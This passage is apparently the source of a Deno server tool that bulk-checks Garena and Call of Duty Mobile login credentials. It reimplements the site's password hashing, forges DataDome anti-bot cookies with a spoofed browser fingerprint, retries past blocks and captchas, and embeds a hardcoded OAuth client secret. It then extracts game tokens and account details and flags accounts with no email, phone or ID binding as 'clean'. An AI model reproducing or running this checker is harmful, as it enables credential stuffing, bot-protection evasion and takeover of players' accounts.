import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Rate limiting
const RATE_LIMIT_MAX = 30;
const RATE_LIMIT_WINDOW = 60000;
const rateLimitStore = new Map<string, { count: number; start: number }>();

function checkRateLimit(clientId: string): { allowed: boolean; retryAfter?: number } {
  const now = Date.now();
  const record = rateLimitStore.get(clientId);
  if (!record || now - record.start > RATE_LIMIT_WINDOW) {
    rateLimitStore.set(clientId, { count: 1, start: now });
    return { allowed: true };
  }
  if (record.count >= RATE_LIMIT_MAX) {
    return { allowed: false, retryAfter: Math.ceil((record.start + RATE_LIMIT_WINDOW - now) / 1000) };
  }
  record.count++;
  return { allowed: true };
}

// Crypto utilities
function hexToBytes(hex: string): Uint8Array {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
  }
  return bytes;
}

function bytesToHex(bytes: Uint8Array): string {
  return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
}

function md5(message: string): string {
  const encoder = new TextEncoder();
  const data = encoder.encode(message);
  
  function rotl(x: number, n: number) { return ((x << n) | (x >>> (32 - n))) >>> 0; }
  function add(x: number, y: number) { return (x + y) >>> 0; }

  const s = [7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21];
  const K = Array.from({length: 64}, (_, i) => Math.floor(Math.abs(Math.sin(i + 1)) * 0x100000000));

  let [a0, b0, c0, d0] = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476];
  
  const msgLen = data.length;
  const totalLen = Math.ceil((msgLen + 9) / 64) * 64;
  const padded = new Uint8Array(totalLen);
  padded.set(data);
  padded[msgLen] = 0x80;
  new DataView(padded.buffer).setUint32(totalLen - 8, (msgLen * 8) & 0xFFFFFFFF, true);

  for (let i = 0; i < totalLen; i += 64) {
    const M = new Uint32Array(16);
    for (let j = 0; j < 16; j++) M[j] = new DataView(padded.buffer).getUint32(i + j * 4, true);
    
    let [A, B, C, D] = [a0, b0, c0, d0];
    for (let j = 0; j < 64; j++) {
      let F: number, g: number;
      if (j < 16) { F = (B & C) | ((~B >>> 0) & D); g = j; }
      else if (j < 32) { F = (D & B) | ((~D >>> 0) & C); g = (5 * j + 1) % 16; }
      else if (j < 48) { F = B ^ C ^ D; g = (3 * j + 5) % 16; }
      else { F = C ^ (B | (~D >>> 0)); g = (7 * j) % 16; }
      F = add(add(add(F >>> 0, A), K[j]), M[g]);
      A = D; D = C; C = B; B = add(B, rotl(F, s[j]));
    }
    a0 = add(a0, A); b0 = add(b0, B); c0 = add(c0, C); d0 = add(d0, D);
  }

  const result = new Uint8Array(16);
  const view = new DataView(result.buffer);
  view.setUint32(0, a0, true); view.setUint32(4, b0, true);
  view.setUint32(8, c0, true); view.setUint32(12, d0, true);
  return bytesToHex(result);
}

async function sha256(message: string): Promise<string> {
  const data = new TextEncoder().encode(message);
  const hash = await crypto.subtle.digest('SHA-256', data);
  return bytesToHex(new Uint8Array(hash));
}

// AES-128 ECB encryption (matching v7.py encode function)
function aesEcbEncrypt(plainHex: string, keyHex: string): string {
  const pt = hexToBytes(plainHex), key = hexToBytes(keyHex);
  const sBox = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16];
  const rCon = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36];
  const xtime = (x: number) => ((x << 1) ^ (((x >>> 7) & 1) * 0x1b)) & 0xff;
  
  const w: number[][] = [];
  for (let i = 0; i < 4; i++) w[i] = [key[4*i], key[4*i+1], key[4*i+2], key[4*i+3]];
  for (let i = 4; i < 44; i++) {
    const t = w[i-1].slice();
    if (i % 4 === 0) {
      const rot = [t[1], t[2], t[3], t[0]].map(b => sBox[b]);
      rot[0] ^= rCon[(i/4)-1];
      for (let j = 0; j < 4; j++) t[j] = rot[j];
    }
    w[i] = w[i-4].map((b, j) => b ^ t[j]);
  }
  
  const roundKeys: number[][][] = [];
  for (let r = 0; r < 11; r++) {
    const rk: number[][] = [[],[],[],[]];
    for (let c = 0; c < 4; c++) for (let row = 0; row < 4; row++) rk[row][c] = w[r*4+c][row];
    roundKeys.push(rk);
  }

  const resultArr: number[] = [];
  for (let b = 0; b < pt.length; b += 16) {
    const state: number[][] = [[],[],[],[]];
    for (let c = 0; c < 4; c++) for (let r = 0; r < 4; r++) state[r][c] = pt[b + c*4 + r] || 0;
    
    for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] ^= roundKeys[0][i][j];
    
    for (let round = 1; round < 10; round++) {
      for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] = sBox[state[i][j]];
      for (let i = 1; i < 4; i++) {
        const t = state[i].slice(0, i);
        for (let j = 0; j < 4-i; j++) state[i][j] = state[i][j+i];
        for (let j = 0; j < i; j++) state[i][4-i+j] = t[j];
      }
      for (let c = 0; c < 4; c++) {
        const [a, bb, cc, d] = [state[0][c], state[1][c], state[2][c], state[3][c]];
        state[0][c] = xtime(a) ^ xtime(bb) ^ bb ^ cc ^ d;
        state[1][c] = a ^ xtime(bb) ^ xtime(cc) ^ cc ^ d;
        state[2][c] = a ^ bb ^ xtime(cc) ^ xtime(d) ^ d;
        state[3][c] = xtime(a) ^ a ^ bb ^ cc ^ xtime(d);
      }
      for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] ^= roundKeys[round][i][j];
    }
    
    for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] = sBox[state[i][j]];
    for (let i = 1; i < 4; i++) {
      const t = state[i].slice(0, i);
      for (let j = 0; j < 4-i; j++) state[i][j] = state[i][j+i];
      for (let j = 0; j < i; j++) state[i][4-i+j] = t[j];
    }
    for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] ^= roundKeys[10][i][j];
    
    for (let c = 0; c < 4; c++) for (let r = 0; r < 4; r++) resultArr.push(state[r][c]);
  }
  
  return bytesToHex(new Uint8Array(resultArr)).substring(0, 32);
}

// Hash password: MD5 -> SHA256(md5+v1) -> SHA256(result+v2) -> AES_ECB(md5, outer_hash)
// Matches v7.py: hash_password(password, v1, v2)
async function hashPassword(password: string, v1: string, v2: string): Promise<string> {
  const passMd5 = md5(decodeURIComponent(password));
  const innerHash = await sha256(passMd5 + v1);
  const outerHash = await sha256(innerHash + v2);
  const encrypted = aesEcbEncrypt(passMd5, outerHash);
  return encrypted;
}

// Retry configuration
const RETRY_CONFIG = {
  maxRetries: 3,
  baseDelay: 1000,
  maxDelay: 5000,
};

async function retryDelay(attempt: number): Promise<void> {
  const delayMs = Math.min(
    RETRY_CONFIG.baseDelay * Math.pow(2, attempt) + Math.random() * 500,
    RETRY_CONFIG.maxDelay
  );
  console.log(`[RETRY] Waiting ${Math.round(delayMs)}ms before attempt ${attempt + 2}`);
  await new Promise(resolve => setTimeout(resolve, delayMs));
}

// Get DataDome cookie - matches v7.py get_datadome_cookie()
async function getDataDomeCookie(): Promise<string | null> {
  try {
    const url = 'https://dd.garena.com/js/';
    const jsData = JSON.stringify({
      "ttst": 76.70000004768372, "ifov": false, "hc": 4, "br_oh": 824, "br_ow": 1536,
      "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
      "wbd": false, "dp0": true, "tagpu": 5.738121195951787, "wdif": false, "wdifrm": false,
      "npmtm": false, "br_h": 738, "br_w": 260, "isf": false, "nddc": 1, "rs_h": 864,
      "rs_w": 1536, "rs_cd": 24, "phe": false, "nm": false, "jsf": false, "lg": "en-US",
      "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": true, "str_ls": true,
      "str_idb": true, "str_odb": false, "plgod": false, "plg": 5, "plgne": true,
      "plgre": true, "plgof": false, "plggt": false, "pltod": false, "hcovdr": false,
      "hcovdr2": false, "plovdr": false, "plovdr2": false, "ftsovdr": false, "ftsovdr2": false,
      "lb": false, "eva": 33, "lo": false, "ts_mtp": 0, "ts_tec": false, "ts_tsa": false,
      "vnd": "Google Inc.", "bid": "NA", "mmt": "application/pdf,text/pdf",
      "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
      "hdn": false, "awe": false, "geb": false, "dat": false, "med": "defined",
      "aco": "probably", "acots": false, "acmp": "probably", "acmpts": true, "acw": "probably",
      "acwts": false, "acma": "maybe", "acmats": false, "acaa": "probably", "acaats": true,
      "ac3": "", "ac3ts": false, "acf": "probably", "acfts": false, "acmp4": "maybe",
      "acmp4ts": false, "acmp3": "probably", "acmp3ts": false, "acwm": "maybe", "acwmts": false,
      "ocpt": false, "vco": "", "vcots": false, "vch": "probably", "vchts": true,
      "vcw": "probably", "vcwts": true, "vc3": "maybe", "vc3ts": false, "vcmp": "",
      "vcmpts": false, "vcq": "maybe", "vcqts": false, "vc1": "probably", "vc1ts": true,
      "dvm": 8, "sqt": false, "so": "landscape-primary", "bda": false, "wdw": true,
      "prm": true, "tzp": true, "cvs": true, "usb": true, "cap": true, "tbf": false,
      "lgs": true, "tpd": true
    });

    const payload = new URLSearchParams({
      jsData: jsData,
      eventCounters: '[]',
      jsType: 'ch',
      cid: 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
      ddk: 'AE3F04AD3F0D3A462481A337485081',
      Referer: 'https://account.garena.com/',
      request: '/',
      responsePage: 'origin',
      ddv: '4.35.4'
    });

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
      },
      body: payload.toString()
    });

    const data = await response.json();
    console.log('[DATADOME] Response status:', data.status);
    
    if (data.status === 200 && data.cookie) {
      const cookie = data.cookie.split(';')[0].split('=')[1];
      console.log('[DATADOME] Got cookie');
      return cookie;
    }
    return null;
  } catch (e) {
    console.log('[DATADOME] Error:', e);
    return null;
  }
}

// Prelogin - matches v7.py prelogin() with retry on 403
async function prelogin(account: string, datadome: string): Promise<{ v1: string; v2: string; newDatadome?: string } | null> {
  const retries = 3;
  
  for (let attempt = 0; attempt < retries; attempt++) {
    try {
      const timestamp = Date.now();
      const params = new URLSearchParams({
        app_id: '10100',
        account: account,
        format: 'json',
        id: String(timestamp)
      });

      const url = `https://sso.garena.com/api/prelogin?${params.toString()}`;
      
      console.log(`[PRELOGIN] Attempt ${attempt + 1}/${retries} for ${account}`);
      
      const response = await fetch(url, {
        method: 'GET',
        headers: {
          'accept': 'application/json, text/plain, */*',
          'accept-encoding': 'gzip, deflate, br, zstd',
          'accept-language': 'en-US,en;q=0.9',
          'connection': 'keep-alive',
          'host': 'sso.garena.com',
          'referer': `https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account=${encodeURIComponent(account)}`,
          'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Windows"',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-origin',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
          'cookie': `datadome=${datadome}`
        }
      });

      console.log('[PRELOGIN] Status:', response.status);
      
      // Extract new datadome from response cookies
      let newDatadome: string | undefined;
      const setCookie = response.headers.get('set-cookie') || '';
      if (setCookie.includes('datadome=')) {
        const match = setCookie.match(/datadome=([^;]+)/);
        if (match) {
          newDatadome = match[1];
          datadome = newDatadome; // Use new datadome for next attempt
          console.log('[PRELOGIN] Got new datadome from response');
        }
      }
      
      if (response.status === 403) {
        console.log('[PRELOGIN] 403 - DataDome blocked');
        if (newDatadome && attempt < retries - 1) {
          console.log('[PRELOGIN] Retrying with new cookies from 403...');
          await new Promise(resolve => setTimeout(resolve, 100));
          continue;
        }
        return null;
      }
      
      const text = await response.text();
      console.log('[PRELOGIN] Response:', text.substring(0, 200));
      
      try {
        const data = JSON.parse(text);
        
        if (data.error) {
          console.log('[PRELOGIN] Error:', data.error);
          return null;
        }
        
        if (data.v1 && data.v2) {
          console.log('[PRELOGIN] Success - got v1/v2');
          return { v1: data.v1, v2: data.v2, newDatadome };
        }
      } catch (e) {
        console.log('[PRELOGIN] Parse error');
        if (attempt < retries - 1) {
          await new Promise(resolve => setTimeout(resolve, 500));
          continue;
        }
      }
      
      return null;
    } catch (e) {
      console.log(`[PRELOGIN] Error attempt ${attempt + 1}:`, e);
      if (attempt < retries - 1) {
        await new Promise(resolve => setTimeout(resolve, 100));
        continue;
      }
    }
  }
  
  return null;
}

// Login - matches v7.py login() with retry
async function login(account: string, password: string, v1: string, v2: string, datadome: string): Promise<{ ssoKey: string } | { error: string }> {
  const hashedPassword = await hashPassword(password, v1, v2);
  
  const retries = 3;
  for (let attempt = 0; attempt < retries; attempt++) {
    try {
      const timestamp = Date.now();
      const params = new URLSearchParams({
        app_id: '10100',
        account: account,
        password: hashedPassword,
        redirect_uri: 'https://account.garena.com/',
        format: 'json',
        id: String(timestamp)
      });

      const url = `https://sso.garena.com/api/login?${params.toString()}`;
      
      console.log(`[LOGIN] Attempt ${attempt + 1}/${retries} for: ${account}`);
      
      const response = await fetch(url, {
        method: 'GET',
        headers: {
          'accept': 'application/json, text/plain, */*',
          'referer': 'https://account.garena.com/',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36',
          'cookie': `datadome=${datadome}`
        }
      });

      console.log('[LOGIN] Status:', response.status);
      
      // Extract sso_key from set-cookie header
      const setCookie = response.headers.get('set-cookie') || '';
      let ssoKey = '';
      
      if (setCookie.includes('sso_key=')) {
        const match = setCookie.match(/sso_key=([^;]+)/);
        if (match) ssoKey = match[1];
      }
      
      // Also extract new datadome if present
      if (setCookie.includes('datadome=')) {
        const match = setCookie.match(/datadome=([^;]+)/);
        if (match) datadome = match[1];
      }
      
      const text = await response.text();
      console.log('[LOGIN] Response:', text.substring(0, 300));
      
      try {
        const data = JSON.parse(text);
        
        if (data.error) {
          const errorMsg = data.error;
          console.log('[LOGIN] Error:', errorMsg);
          
          // These errors are not retryable
          if (errorMsg === 'ACCOUNT DOESNT EXIST' || errorMsg.includes('password')) {
            return { error: errorMsg };
          }
          
          // Captcha - wait and retry
          if (errorMsg.toLowerCase().includes('captcha')) {
            console.log('[LOGIN] Captcha required, waiting...');
            if (attempt < retries - 1) {
              await new Promise(resolve => setTimeout(resolve, 3000));
              continue;
            }
          }
          
          return { error: errorMsg };
        }
        
        // Check for sso_key in response
        const responseSsoKey = ssoKey || data.sso_key || data.session_key;
        if (responseSsoKey) {
          return { ssoKey: responseSsoKey };
        }
      } catch (e) {
        console.log('[LOGIN] Parse error');
        if (attempt < retries - 1) {
          await new Promise(resolve => setTimeout(resolve, 500));
          continue;
        }
      }
      
      if (ssoKey) {
        return { ssoKey };
      }
      
    } catch (e) {
      console.log(`[LOGIN] Error attempt ${attempt + 1}:`, e);
      if (attempt < retries - 1) {
        await new Promise(resolve => setTimeout(resolve, 100));
        continue;
      }
    }
  }
  
  return { error: 'Login failed after retries' };
}

// Get account info - matches v7.py account init
async function getAccountInfo(ssoKey: string, datadome: string): Promise<Record<string, unknown> | null> {
  try {
    const response = await fetch('https://account.garena.com/api/account/init', {
      method: 'GET',
      headers: {
        'accept': '*/*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36',
        'cookie': `sso_key=${ssoKey}; datadome=${datadome}`
      }
    });

    if (response.status === 403) {
      console.log('[ACCOUNT] 403 - Blocked');
      return null;
    }

    if (response.ok) {
      const data = await response.json();
      console.log('[ACCOUNT] Got info');
      
      if (data.error) {
        console.log('[ACCOUNT] Error:', data.error);
        return null;
      }
      
      return data;
    }
  } catch (e) {
    console.log('[ACCOUNT] Error:', e);
  }
  return null;
}

// Get CODM access token - NEW OAuth flow matching v7.py get_codm_access_token()
// Uses authorization code grant with 100082.connect.garena.com
async function getCodmAccessToken(ssoKey: string, datadome: string): Promise<{ accessToken: string; openId: string; uid: string } | null> {
  try {
    // Step 1: Get authorization code
    const randomId = String(Date.now());
    const grantUrl = "https://100082.connect.garena.com/oauth/token/grant";
    
    const grantHeaders: Record<string, string> = {
      "Host": "100082.connect.garena.com",
      "Connection": "keep-alive",
      "sec-ch-ua-platform": '"Android"',
      "User-Agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
      "Accept": "application/json, text/plain, */*",
      "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
      "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
      "sec-ch-ua-mobile": "?1",
      "Origin": "https://100082.connect.garena.com",
      "X-Requested-With": "com.garena.game.codm",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Accept-Language": "en-US,en;q=0.9",
      "cookie": `sso_key=${ssoKey}; datadome=${datadome}`
    };
    
    const grantData = `client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id=${randomId}`;
    
    const grantResponse = await fetch(grantUrl, {
      method: 'POST',
      headers: grantHeaders,
      body: grantData
    });
    
    const grantJson = await grantResponse.json();
    console.log('[CODM_TOKEN] Grant response:', JSON.stringify(grantJson).substring(0, 150));
    
    const authCode = grantJson.code || '';
    if (!authCode) {
      console.log('[CODM_TOKEN] No auth code received');
      return null;
    }
    
    // Step 2: Exchange authorization code for access token
    const tokenUrl = "https://100082.connect.garena.com/oauth/token/exchange";
    
    // Generate device_id
    const deviceId = `02-${crypto.randomUUID()}`;
    
    const tokenHeaders: Record<string, string> = {
      "User-Agent": "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
      "Content-Type": "application/x-www-form-urlencoded",
      "Host": "100082.connect.garena.com",
      "Connection": "Keep-Alive",
      "Accept-Encoding": "gzip",
      "cookie": `sso_key=${ssoKey}; datadome=${datadome}`
    };
    
    const tokenData = `grant_type=authorization_code&code=${authCode}&device_id=${deviceId}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415`;
    
    const tokenResponse = await fetch(tokenUrl, {
      method: 'POST',
      headers: tokenHeaders,
      body: tokenData
    });
    
    const tokenJson = await tokenResponse.json();
    console.log('[CODM_TOKEN] Token response:', JSON.stringify(tokenJson).substring(0, 150));
    
    const accessToken = tokenJson.access_token || '';
    const openId = tokenJson.open_id || '';
    const uid = tokenJson.uid || '';
    
    if (!accessToken) {
      console.log('[CODM_TOKEN] No access token received');
      return null;
    }
    
    return { accessToken, openId, uid };
  } catch (e) {
    console.log('[CODM_TOKEN] Error:', e);
    return null;
  }
}

// Process CODM callback - matches v7.py process_codm_callback()
// Tries both old (non-AOS) and new (AOS) endpoints
async function processCodmCallback(accessToken: string): Promise<{ token: string | null; status: string }> {
  try {
    // Method 1: Try old endpoint (non-AOS) first
    const oldCallbackUrl = `https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token=${accessToken}`;
    
    const oldResponse = await fetch(oldCallbackUrl, {
      method: 'GET',
      headers: {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36',
        'referer': 'https://auth.garena.com/'
      },
      redirect: 'manual'
    });

    const oldLocation = oldResponse.headers.get('location') || '';
    console.log('[CODM_CALLBACK] Old endpoint location:', oldLocation.substring(0, 100));
    
    if (oldLocation.includes('err=3')) {
      // Try AOS endpoint before returning no_codm
    } else if (oldLocation.includes('token=')) {
      const token = oldLocation.split('token=')[1]?.split('&')[0];
      if (token) return { token, status: 'success' };
    }
    
    // Method 2: Try new AOS endpoint
    const aosCallbackUrl = `https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token=${accessToken}`;
    
    const aosResponse = await fetch(aosCallbackUrl, {
      method: 'GET',
      headers: {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
        'referer': 'https://100082.connect.garena.com/',
        'x-requested-with': 'com.garena.game.codm'
      },
      redirect: 'manual'
    });

    const aosLocation = aosResponse.headers.get('location') || '';
    console.log('[CODM_CALLBACK] AOS endpoint location:', aosLocation.substring(0, 100));
    
    if (aosLocation.includes('err=3')) {
      return { token: null, status: 'no_codm' };
    }
    
    if (aosLocation.includes('token=')) {
      const token = aosLocation.split('token=')[1]?.split('&')[0];
      if (token) return { token, status: 'success' };
    }
    
    // If old endpoint had err=3, report no_codm
    if (oldLocation.includes('err=3')) {
      return { token: null, status: 'no_codm' };
    }
    
    return { token: null, status: 'unknown_error' };
  } catch (e) {
    console.log('[CODM_CALLBACK] Error:', e);
    return { token: null, status: 'error' };
  }
}

// Get CODM user info - matches v7.py get_codm_user_info()
// First tries JWT decode, then falls back to AOS API endpoint
async function getCodmUserInfo(token: string): Promise<Record<string, unknown> | null> {
  try {
    // Method 1: Try JWT decode first (faster, no network request)
    try {
      const parts = token.split('.');
      if (parts.length === 3) {
        let payload = parts[1];
        // Add padding
        const padding = 4 - (payload.length % 4);
        if (padding !== 4) {
          payload += '='.repeat(padding);
        }
        
        // Base64url decode
        const decoded = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
        const jwtData = JSON.parse(decoded);
        
        const userData = jwtData.user || {};
        if (userData && (userData.codm_nickname || userData.nickname)) {
          console.log('[CODM_USER] Got info from JWT decode');
          return {
            codm_nickname: userData.codm_nickname || userData.nickname || 'N/A',
            codm_level: userData.codm_level || 'N/A',
            region: userData.region || 'N/A',
            uid: userData.uid || 'N/A',
            open_id: userData.open_id || 'N/A',
            t_open_id: userData.t_open_id || 'N/A'
          };
        }
      }
    } catch (e) {
      console.log('[CODM_USER] JWT decode failed, trying API...');
    }
    
    // Method 2: Try AOS API endpoint (matching v7.py)
    const aosUrl = "https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/";
    const aosResponse = await fetch(aosUrl, {
      method: 'GET',
      headers: {
        'accept': 'application/json, text/plain, */*',
        'codm-delete-token': token,
        'origin': 'https://delete-request-aos.codm.garena.co.id',
        'referer': 'https://delete-request-aos.codm.garena.co.id/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
        'x-requested-with': 'com.garena.game.codm'
      }
    });

    const aosData = await aosResponse.json();
    console.log('[CODM_USER] AOS Response:', JSON.stringify(aosData).substring(0, 200));
    
    if (aosData.user) {
      return {
        codm_nickname: aosData.user.codm_nickname || 'N/A',
        codm_level: aosData.user.codm_level || 'N/A',
        region: aosData.user.region || 'N/A',
        uid: aosData.user.uid || 'N/A',
        open_id: aosData.user.open_id || 'N/A',
        t_open_id: aosData.user.t_open_id || 'N/A'
      };
    }
    
    // Method 3: Fallback to old endpoint
    const oldUrl = "https://api-delete-request.codm.garena.co.id/oauth/check_login/";
    const oldResponse = await fetch(oldUrl, {
      method: 'GET',
      headers: {
        'Accept': 'application/json, text/plain, */*',
        'codm-delete-token': token,
        'Origin': 'https://delete-request.codm.garena.co.id',
        'Referer': 'https://delete-request.codm.garena.co.id/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 Chrome/107.0.0.0 Mobile Safari/537.36'
      }
    });

    const oldData = await oldResponse.json();
    console.log('[CODM_USER] Old Response:', JSON.stringify(oldData).substring(0, 200));
    
    if (oldData.user) {
      return {
        codm_nickname: oldData.user.codm_nickname || 'N/A',
        codm_level: oldData.user.codm_level || 'N/A',
        region: oldData.user.region || 'N/A',
        uid: oldData.user.uid || 'N/A',
        open_id: oldData.user.open_id || 'N/A',
        t_open_id: oldData.user.t_open_id || 'N/A'
      };
    }
    
    return null;
  } catch (e) {
    console.log('[CODM_USER] Error:', e);
    return null;
  }
}

// Parse account details - matches v7.py parse_account_details()
function parseAccountDetails(data: Record<string, unknown>): Record<string, unknown> {
  const userInfo = (data.user_info || data) as Record<string, unknown>;
  
  const email = (userInfo.email as string) || 'N/A';
  const emailVerified = Boolean(userInfo.email_v);
  const mobileNo = (userInfo.mobile_no as string) || '';
  const fbConnected = Boolean(userInfo.is_fbconnect_enabled);
  const fbAccount = (userInfo.fb_account as Record<string, unknown>) || {};
  const idCard = (userInfo.idcard as string) || '';
  const accCountry = (userInfo.acc_country as string) || 'N/A';
  const countryCode = (userInfo.country_code as string) || 'N/A';
  
  // Build binds array - matching v7.py logic exactly
  const binds: string[] = [];
  if (email && email !== 'N/A' && !email.startsWith('***') && email.includes('@') && !email.endsWith('@gmail.com') && !email.includes('****')) {
    binds.push('Email');
  }
  if (mobileNo && mobileNo.trim()) binds.push('Phone');
  if (fbConnected) binds.push('Facebook');
  if (idCard && idCard.trim()) binds.push('ID Card');
  
  // Clean status: clean only if no email verified AND no binds
  const isClean = !emailVerified && binds.length === 0;
  
  // Security info
  const twoStepVerify = Boolean(userInfo.two_step_verify_enable);
  const authenticator = Boolean(userInfo.authenticator_enable);
  const suspicious = Boolean(userInfo.suspicious);
  
  const securityIndicators: string[] = [];
